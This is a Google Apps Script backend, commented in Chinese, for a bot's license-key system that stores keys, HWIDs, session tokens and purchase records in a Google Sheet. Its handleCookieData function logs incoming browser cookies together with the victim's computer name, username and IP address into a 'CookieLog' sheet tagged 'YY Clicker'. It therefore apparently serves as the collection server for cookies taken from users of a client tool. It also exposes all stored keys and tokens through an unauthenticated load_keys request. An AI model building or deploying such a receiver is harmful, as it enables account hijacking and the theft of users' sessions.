/**
 * Google Apps Script — 統一接收端（雙 Key 系統 + Session Token）
 * 
 * 功能：
 *   1. Cookie 資料接收（CookieLog 工作表）
 *   2. 用戶購買資料接收（用戶資料 工作表）
 *   3. 密鑰+金鑰永久儲存/更新（金鑰記錄 工作表）
 *   4. HWID + Session Token 更新/重置（更新金鑰記錄中的 HWID + 機碼 + session_token 欄位）
 *   5. 金鑰載入 API（Bot 重啟時 GET ?action=load_keys 載入所有資料）
 *
 * 金鑰記錄工作表欄位：
 *   secret_key | license_key | username | user_id | status | hwid | machine_code | session_token | created_at | updated_at
 *
 * 部署步驟：
 *   1. 將此程式碼貼入 Google Apps Script 的 Code.gs
 *   2. 將 SPREADSHEET_ID 替換為您的試算表 ID
 *   3. 部署為 Web App（執行身分：我，存取權限：所有人）
 *   4. 每次更新程式碼後，需重新部署（管理部署作業 → 編輯 → 新版本）
 */

// ⚠ 請替換為您的試算表 ID
var SPREADSHEET_ID = "YOUR_SPREADSHEET_ID_HERE";

// ======================================================================
// 取得或建立工作表
// ======================================================================
function getOrCreateSheet(ss, name, headers, headerColor) {
  var sheet = ss.getSheetByName(name);
  if (!sheet) {
    sheet = ss.insertSheet(name);
    if (headers && headers.length > 0) {
      sheet.appendRow(headers);
      var headerRange = sheet.getRange(1, 1, 1, headers.length);
      headerRange.setFontWeight("bold");
      headerRange.setBackground(headerColor || "#333333");
      headerRange.setFontColor("#ffffff");
      sheet.setFrozenRows(1);
    }
  }
  return sheet;
}

// 金鑰記錄的標準欄位（新增 session_token）
var KEY_HEADERS = ["secret_key", "license_key", "username", "user_id", "status", "hwid", "machine_code", "session_token", "created_at", "updated_at"];

// ======================================================================
// GET 請求處理
// ======================================================================
function doGet(e) {
  var action = (e.parameter && e.parameter.action) ? e.parameter.action : "";

  if (action === "load_keys") {
    return loadAllKeys();
  }

  return ContentService
    .createTextOutput(JSON.stringify({
      status: "ok",
      message: "Google Apps Script 統一接收端運作中（雙 Key 系統 + Session Token）",
      endpoints: ["CookieLog", "用戶資料", "金鑰記錄"],
      actions: ["load_keys"]
    }))
    .setMimeType(ContentService.MimeType.JSON);
}

// ======================================================================
// 載入所有金鑰（Bot 重啟時呼叫 GET ?action=load_keys）
// ======================================================================
function loadAllKeys() {
  try {
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var sheet = getOrCreateSheet(ss, "金鑰記錄", KEY_HEADERS, "#27ae60");
    var data = sheet.getDataRange().getValues();

    if (data.length <= 1) {
      return ContentService.createTextOutput(
        JSON.stringify({ status: "ok", keys: [], total: 0, message: "沒有金鑰記錄" })
      ).setMimeType(ContentService.MimeType.JSON);
    }

    var headerRow = data[0];
    var keys = [];

    for (var i = 1; i < data.length; i++) {
      var row = data[i];
      var keyObj = {};
      for (var j = 0; j < headerRow.length; j++) {
        keyObj[headerRow[j]] = row[j] !== undefined ? String(row[j]) : "";
      }
      // 只要有 secret_key 或 license_key 就載入
      if ((keyObj.secret_key && keyObj.secret_key !== "") || 
          (keyObj.license_key && keyObj.license_key !== "") ||
          (keyObj.key && keyObj.key !== "")) {
        keys.push(keyObj);
      }
    }

    return ContentService.createTextOutput(
      JSON.stringify({ status: "ok", keys: keys, total: keys.length })
    ).setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(
      JSON.stringify({ status: "error", message: err.toString() })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}

// ======================================================================
// POST 請求處理（統一入口）
// ======================================================================
function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var type = data.type || "";

    if (type === "key_save") {
      return handleKeySave(ss, data);
    }
    if (type === "hwid_update") {
      return handleHwidUpdate(ss, data);
    }
    if (type === "hwid_reset") {
      return handleHwidReset(ss, data);
    }
    if (type === "user_data") {
      return handleUserData(ss, data);
    }

    // 向後相容
    if (data.cookie) {
      return handleCookieData(ss, data);
    }
    if (data.purchase_item) {
      return handleUserData(ss, data);
    }
    if ((data.secret_key || data.key) && data.user_id) {
      return handleKeySave(ss, data);
    }

    return ContentService.createTextOutput(
      JSON.stringify({ status: "error", message: "未知的資料類型" })
    ).setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(
      JSON.stringify({ status: "error", message: err.toString() })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}

// ======================================================================
// 處理 Cookie 資料
// ======================================================================
function handleCookieData(ss, data) {
  var headers = ["時間戳記", "電腦名稱", "使用者名稱", "Cookie 值", "IP 位址", "來源"];
  var sheet = getOrCreateSheet(ss, "CookieLog", headers, "#c0392b");

  var timestamp = new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" });
  sheet.appendRow([
    timestamp,
    data.computer_name || "N/A",
    data.username || "N/A",
    data.cookie || "N/A",
    data.ip || "N/A",
    data.source || "YY Clicker"
  ]);

  return ContentService.createTextOutput(
    JSON.stringify({ status: "ok", message: "Cookie 資料已寫入" })
  ).setMimeType(ContentService.MimeType.JSON);
}

// ======================================================================
// 處理用戶購買資料
// ======================================================================
function handleUserData(ss, data) {
  var headers = ["使用者名稱", "使用者ID", "使用者購買項目", "使用者購買金額", "時間戳記"];
  var sheet = getOrCreateSheet(ss, "用戶資料", headers, "#4a86c8");

  sheet.appendRow([
    data.username || "N/A",
    data.user_id || "N/A",
    data.purchase_item || "N/A",
    data.purchase_amount || "N/A",
    data.timestamp || new Date().toISOString()
  ]);

  return ContentService.createTextOutput(
    JSON.stringify({ status: "ok", message: "用戶資料已寫入" })
  ).setMimeType(ContentService.MimeType.JSON);
}

// ======================================================================
// 自動遷移舊版工作表（9 欄 → 10 欄，新增 session_token）
// ======================================================================
function migrateSheetIfNeeded(sheet) {
  var headerRow = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  
  // 檢查是否已有 session_token 欄位
  var hasSessionToken = false;
  for (var i = 0; i < headerRow.length; i++) {
    if (headerRow[i] === "session_token") {
      hasSessionToken = true;
      break;
    }
  }
  
  if (!hasSessionToken) {
    // 找到 machine_code 欄位的位置
    var mcCol = -1;
    for (var i = 0; i < headerRow.length; i++) {
      if (headerRow[i] === "machine_code") {
        mcCol = i + 1; // 1-indexed
        break;
      }
    }
    
    if (mcCol > 0) {
      // 在 machine_code 後面插入 session_token 欄位
      sheet.insertColumnAfter(mcCol);
      sheet.getRange(1, mcCol + 1).setValue("session_token");
      sheet.getRange(1, mcCol + 1).setFontWeight("bold");
      sheet.getRange(1, mcCol + 1).setBackground("#27ae60");
      sheet.getRange(1, mcCol + 1).setFontColor("#ffffff");
    }
  }
}

// ======================================================================
// 處理金鑰儲存（雙 Key 系統 + Session Token）
// 欄位：secret_key | license_key | username | user_id | status | hwid | machine_code | session_token | created_at | updated_at
// ======================================================================
function handleKeySave(ss, data) {
  var sheet = getOrCreateSheet(ss, "金鑰記錄", KEY_HEADERS, "#27ae60");
  
  // 自動遷移舊版工作表
  migrateSheetIfNeeded(sheet);

  var secretKey = data.secret_key || data.key || "";
  var licenseKey = data.license_key || "";
  var now = data.timestamp || new Date().toISOString();

  // 查找是否已存在（先用 secret_key 查，再用 user_id 查）
  var allData = sheet.getDataRange().getValues();
  var headerRow = allData[0];
  var secretKeyCol = headerRow.indexOf("secret_key");
  var licenseKeyCol = headerRow.indexOf("license_key");
  var userIdCol = headerRow.indexOf("user_id");
  
  // 如果欄位不存在（舊版工作表），使用 key 欄位
  if (secretKeyCol === -1) {
    secretKeyCol = headerRow.indexOf("key");
  }

  var existingRow = -1;

  // 先用 secret_key 查找
  if (secretKey && secretKeyCol >= 0) {
    for (var i = 1; i < allData.length; i++) {
      if (String(allData[i][secretKeyCol]) === secretKey) {
        existingRow = i + 1;
        break;
      }
    }
  }

  // 如果沒找到，用 user_id 查找
  if (existingRow === -1 && data.user_id && userIdCol >= 0) {
    for (var i = 1; i < allData.length; i++) {
      if (String(allData[i][userIdCol]) === String(data.user_id)) {
        existingRow = i + 1;
        break;
      }
    }
  }

  // 找到各欄位的位置
  var sessionTokenCol = headerRow.indexOf("session_token");
  var createdAtCol = headerRow.indexOf("created_at");
  var updatedAtCol = headerRow.indexOf("updated_at");

  if (existingRow > 0) {
    // 更新現有記錄
    if (secretKey) sheet.getRange(existingRow, secretKeyCol + 1).setValue(secretKey);
    if (licenseKey && licenseKeyCol >= 0) sheet.getRange(existingRow, licenseKeyCol + 1).setValue(licenseKey);
    if (data.username) sheet.getRange(existingRow, headerRow.indexOf("username") + 1).setValue(data.username);
    if (data.user_id) sheet.getRange(existingRow, userIdCol + 1).setValue(data.user_id);
    if (data.status) sheet.getRange(existingRow, headerRow.indexOf("status") + 1).setValue(data.status);
    if (data.hwid !== undefined && data.hwid !== "") sheet.getRange(existingRow, headerRow.indexOf("hwid") + 1).setValue(data.hwid);
    if (data.machine_code !== undefined && data.machine_code !== "") sheet.getRange(existingRow, headerRow.indexOf("machine_code") + 1).setValue(data.machine_code);
    if (data.session_token !== undefined && data.session_token !== "" && sessionTokenCol >= 0) {
      sheet.getRange(existingRow, sessionTokenCol + 1).setValue(data.session_token);
    }
    if (updatedAtCol >= 0) sheet.getRange(existingRow, updatedAtCol + 1).setValue(now);

    return ContentService.createTextOutput(
      JSON.stringify({ status: "ok", message: "金鑰已更新", action: "updated" })
    ).setMimeType(ContentService.MimeType.JSON);
  } else {
    // 新增記錄
    sheet.appendRow([
      secretKey,
      licenseKey,
      data.username || "N/A",
      data.user_id || "N/A",
      data.status || "已建立",
      data.hwid || "",
      data.machine_code || "",
      data.session_token || "",
      now,
      now
    ]);

    return ContentService.createTextOutput(
      JSON.stringify({ status: "ok", message: "金鑰已儲存", action: "created" })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}

// ======================================================================
// 處理 HWID 更新 — 用 license_key (data.key) 查找並更新（含 session_token）
// ======================================================================
function handleHwidUpdate(ss, data) {
  var sheet = getOrCreateSheet(ss, "金鑰記錄", KEY_HEADERS, "#27ae60");
  
  // 自動遷移舊版工作表
  migrateSheetIfNeeded(sheet);

  var allData = sheet.getDataRange().getValues();
  var headerRow = allData[0];
  var licenseKeyCol = headerRow.indexOf("license_key");
  var sessionTokenCol = headerRow.indexOf("session_token");
  var updatedAtCol = headerRow.indexOf("updated_at");
  
  // 向後相容：如果沒有 license_key 欄位，用第一欄（key 或 secret_key）
  if (licenseKeyCol === -1) licenseKeyCol = 0;

  for (var i = 1; i < allData.length; i++) {
    if (String(allData[i][licenseKeyCol]) === data.key) {
      var row = i + 1;
      
      // 更新 HWID
      var hwidCol = headerRow.indexOf("hwid");
      var mcCol = headerRow.indexOf("machine_code");
      if (hwidCol >= 0 && data.hwid !== undefined) sheet.getRange(row, hwidCol + 1).setValue(data.hwid || "");
      if (mcCol >= 0 && data.machine_code !== undefined) sheet.getRange(row, mcCol + 1).setValue(data.machine_code || "");
      
      // 更新 session_token
      if (sessionTokenCol >= 0 && data.session_token !== undefined) {
        sheet.getRange(row, sessionTokenCol + 1).setValue(data.session_token || "");
      }
      
      // 更新時間
      if (updatedAtCol >= 0) {
        sheet.getRange(row, updatedAtCol + 1).setValue(data.timestamp || new Date().toISOString());
      }

      return ContentService.createTextOutput(
        JSON.stringify({ status: "ok", message: "HWID 已更新" })
      ).setMimeType(ContentService.MimeType.JSON);
    }
  }

  return ContentService.createTextOutput(
    JSON.stringify({ status: "error", message: "找不到此金鑰" })
  ).setMimeType(ContentService.MimeType.JSON);
}

// ======================================================================
// 處理 HWID 重置（同時清除 session_token）
// ======================================================================
function handleHwidReset(ss, data) {
  var sheet = getOrCreateSheet(ss, "金鑰記錄", KEY_HEADERS, "#27ae60");
  
  // 自動遷移舊版工作表
  migrateSheetIfNeeded(sheet);

  var allData = sheet.getDataRange().getValues();
  var headerRow = allData[0];
  var licenseKeyCol = headerRow.indexOf("license_key");
  var sessionTokenCol = headerRow.indexOf("session_token");
  var updatedAtCol = headerRow.indexOf("updated_at");
  if (licenseKeyCol === -1) licenseKeyCol = 0;

  for (var i = 1; i < allData.length; i++) {
    if (String(allData[i][licenseKeyCol]) === data.key) {
      var row = i + 1;
      
      // 清除 HWID
      var hwidCol = headerRow.indexOf("hwid");
      var mcCol = headerRow.indexOf("machine_code");
      if (hwidCol >= 0) sheet.getRange(row, hwidCol + 1).setValue("");
      if (mcCol >= 0) sheet.getRange(row, mcCol + 1).setValue("");
      
      // 清除 session_token
      if (sessionTokenCol >= 0) sheet.getRange(row, sessionTokenCol + 1).setValue("");
      
      // 更新時間
      if (updatedAtCol >= 0) {
        sheet.getRange(row, updatedAtCol + 1).setValue(data.timestamp || new Date().toISOString());
      }

      return ContentService.createTextOutput(
        JSON.stringify({ status: "ok", message: "HWID 已重置" })
      ).setMimeType(ContentService.MimeType.JSON);
    }
  }

  return ContentService.createTextOutput(
    JSON.stringify({ status: "error", message: "找不到此金鑰" })
  ).setMimeType(ContentService.MimeType.JSON);
}
